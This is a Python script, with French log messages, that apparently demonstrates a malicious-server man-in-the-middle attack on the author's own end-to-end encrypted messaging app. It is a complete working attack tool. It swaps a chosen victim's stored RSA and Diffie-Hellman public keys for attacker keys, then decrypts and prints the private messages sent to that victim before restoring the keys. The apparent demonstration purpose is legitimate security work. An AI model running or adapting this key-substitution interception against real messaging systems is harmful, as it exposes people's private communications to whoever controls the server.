import os
import sys
import time
import json
import base64
import hashlib
import threading
import logging
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

sys.path.append(os.getcwd())
from server import create_app, db
from server.models import User, PrivateMessage

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger('AttackTool')

DH_MODULUS_HEX = (
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"
    "020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437"
    "4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF05"
    "98DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB"
    "9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718"
    "3995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF"
)
DH_P = int(DH_MODULUS_HEX, 16)
DH_G = 2

class CryptoReplica:
    
    @staticmethod
    def generate_dh_keypair():
        """Génère une paire de clés DH compatible"""
        private_key = int.from_bytes(os.urandom(256), 'big') % DH_P
        public_key = pow(DH_G, private_key, DH_P)
        return private_key, public_key

    @staticmethod
    def dh_compute_secret(my_private, other_public_base64):
        """Calcule le secret partagé et dérive la clé AES"""
        
        other_pub_bytes = base64.b64decode(other_public_base64)
        other_pub = int.from_bytes(other_pub_bytes, 'big')
        
        shared_secret = pow(other_pub, my_private, DH_P)
        
        hex_val = hex(shared_secret)[2:]
        if len(hex_val) % 2 != 0:
            hex_val = '0' + hex_val
        secret_bytes = bytes.fromhex(hex_val)
        
        aes_key = hashlib.sha256(secret_bytes).digest()
        return aes_key

    @staticmethod
    def aes_decrypt(ciphertext_b64, nonce_b64, auth_tag_b64, key):
        try:
            ciphertext = base64.b64decode(ciphertext_b64)
            nonce = base64.b64decode(nonce_b64)
            auth_tag = base64.b64decode(auth_tag_b64)
            
            aesgcm = AESGCM(key)
            
            
            plaintext = aesgcm.decrypt(nonce, ciphertext + auth_tag, None)
            return plaintext.decode('utf-8')
        except Exception as e:
            return f"[Erreur de déchiffrement: {e}]"

    @staticmethod
    def generate_rsa_keypair():
        
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        
        pem_priv = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')
        
        
        pem_pub = key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode('utf-8')
        
        return pem_priv, pem_pub


TARGET_USERNAME = None
ORIGINAL_KEYS = {}
FAKE_DH_PRIVATE = None
STOP_EVENT = threading.Event()

def backup_keys(user):
    return {
        'rsa': user.rsa_public_key,
        'dh': user.dh_public_key
    }

def compromise_target(app, username):
    global FAKE_DH_PRIVATE, ORIGINAL_KEYS, TARGET_USERNAME
    
    with app.app_context():
        user = User.query.filter_by(username=username).first()
        if not user:
            logger.error(f"Utilisateur {username} non trouvé!")
            return False

        logger.info(f"Cible trouvée: {user.unique_username} (ID: {user.id})")
        
        
        ORIGINAL_KEYS = backup_keys(user)
        logger.info("Clés originales sauvegardées.")
        
        
        logger.info("Génération des clés malveillantes...")
        FAKE_DH_PRIVATE, fake_dh_pub_int = CryptoReplica.generate_dh_keypair()
        
        
        hex_dh = hex(fake_dh_pub_int)[2:]
        if len(hex_dh) % 2 != 0: hex_dh = '0' + hex_dh
        fake_dh_pub_bytes = bytes.fromhex(hex_dh)
        fake_dh_pub_b64 = base64.b64encode(fake_dh_pub_bytes).decode('utf-8')
        
        
        _, fake_rsa_pub_pem = CryptoReplica.generate_rsa_keypair()
        
        
        user.rsa_public_key = fake_rsa_pub_pem
        user.dh_public_key = fake_dh_pub_b64
        db.session.commit()
        
        TARGET_USERNAME = user.unique_username
        logger.warning(f"!!! UTILISATEUR {username} COMPROMIS !!!")
        logger.warning("Les clés publiques ont été remplacées par celles de l'attaquant.")
        return True

def restore_target(app):
    global TARGET_USERNAME
    if not TARGET_USERNAME or not ORIGINAL_KEYS:
        logger.info("Rien à restaurer.")
        return

    with app.app_context():
        user = User.query.filter_by(unique_username=TARGET_USERNAME).first()
        if user:
            user.rsa_public_key = ORIGINAL_KEYS['rsa']
            user.dh_public_key = ORIGINAL_KEYS['dh']
            db.session.commit()
            logger.info(f"Clés de {TARGET_USERNAME} restaurées avec succès.")
        TARGET_USERNAME = None

def spy_loop(app):
    last_check = 0
    seen_messages = set()
    
    logger.info("Démarrage de l'espionnage... En attente de messages...")
    
    while not STOP_EVENT.is_set():
        with app.app_context():
            
            if not TARGET_USERNAME: 
                time.sleep(1)
                continue
                
            target = User.query.filter_by(unique_username=TARGET_USERNAME).first()
            if not target: continue
            
            
            messages = PrivateMessage.query.filter_by(receiver_id=target.id)\
                .order_by(PrivateMessage.created_at.desc()).limit(10).all()
            
            for msg in reversed(messages):
                if msg.id in seen_messages:
                    continue
                seen_messages.add(msg.id)
                
                
                sender = User.query.get(msg.sender_id)
                logger.info(f"\n[INTERCEPTION] Message de {sender.username} -> {target.username}")
                
                try:
                    
                    
                    
                    
                    
                    sender_dh_pub_b64 = sender.dh_public_key
                    
                    
                    aes_key = CryptoReplica.dh_compute_secret(FAKE_DH_PRIVATE, sender_dh_pub_b64)
                    
                    
                    plaintext = CryptoReplica.aes_decrypt(
                        msg.ciphertext, 
                        msg.nonce, 
                        msg.auth_tag, 
                        aes_key
                    )
                    
                    print(f"\033[91m{'='*60}")
                    print(f" CONTENU DÉCHIFFRÉ : {plaintext}")
                    print(f"{'='*60}\033[0m")
                    
                except Exception as e:
                    logger.error(f"Echec de l'interception: {e}")
        
        time.sleep(2)

def main():
    app = create_app()
    
    
    print("\n=== DEMO ATTAQUE MAN-IN-THE-MIDDLE (MALICIOUS SERVER) ===")
    
    with app.app_context():
        users = User.query.all()
        print("Utilisateurs disponibles :")
        for i, u in enumerate(users):
            print(f"{i+1}. {u.username} ({u.unique_username})")
            
    choice = input("\nEntrez le numéro de la victime à compromettre (ou 'q' pour quitter): ")
    if choice.lower() == 'q': return

    try:
        idx = int(choice) - 1
        with app.app_context():
            target_user = users[idx].username
    except:
        print("Choix invalide")
        return

    
    if compromise_target(app, target_user):
        
        spy_thread = threading.Thread(target=spy_loop, args=(app,))
        spy_thread.start()
        
        try:
            input("\nppuyez sur ENTRÉE pour arrêter l'attaque et restaurer les clés...\n")
        except KeyboardInterrupt:
            pass
        finally:
            STOP_EVENT.set()
            spy_thread.join()
            restore_target(app)
            print("\nAttaque terminée. Au revoir.")

if __name__ == "__main__":
    main()
